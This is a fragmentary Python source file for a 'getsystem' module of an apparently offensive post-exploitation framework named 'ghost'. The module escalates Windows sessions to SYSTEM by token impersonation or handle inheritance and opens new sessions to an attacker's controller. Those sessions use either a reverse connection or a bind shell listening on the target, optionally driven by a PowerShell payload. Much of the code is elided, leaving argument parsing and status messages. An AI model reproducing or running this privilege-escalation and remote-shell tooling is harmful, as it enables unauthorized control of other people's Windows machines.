...
from ghost.modules.lib.windows.migrate import migrate
...
class GetSystem(GhostModule):
    ...
    In this case, the created SYSTEM launcher will connect to your ghost contoller automatically.
    ...
    def init_argparse(cls):
        cls.arg_parser = GhostArgumentParser(prog="getsystem", description=cls.__doc__)
        cls.arg_parser.add_argument(
            '-m', '--method', dest='method', choices=['impersonate', 'inheritance'],
            default=None, help='Method for gaining a new ghost session as SYSTEM',
            required=True,
        )
        cls.arg_parser.add_argument(
    ...
    def run(self, args):
        ...
        # Case of a ghost bind shell if ps1 mode is used (no reverse connection possible)
        if launcherType == "bind":
            self.info('The current ghost launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))
            isBindLauncherForPs1 = True
            self.info('Consequently, powershell option is enabled automatically')
            args.powershell = True
        else:
            self.info('The current ghost launcher is using a REVERSE connection (e.g. \'auto_proxy\' or \'connect\' launcher)')
            isBindLauncherForPs1 = False

        # A Powershell payload is used for getting a ghost session as SYSTEM
        if args.powershell:
            self.info('A powershell payload will be used for getting a ghost session as SYSTEM')
            ...
            if isBindLauncherForPs1:
                ...
                self.info("The ps1 script used for getting a ghost session as SYSTEM will be configured for listening on {0} on the target".format(listeningAddressPortForBindPs1))
                bindConf = self.client.get_conf()
                #Modify the listening port on the conf. If it is not modified, the ps1 script will listen on the same port as the inital ghost launcher on the target
        ...
        if args.powershell:
            ...
            if isBindLauncherForPs1:
                self.success(
                    ...
                    'try "connect --host {0}" in ghost shell'.format(listeningAddressPortForBindPs1))
            else:
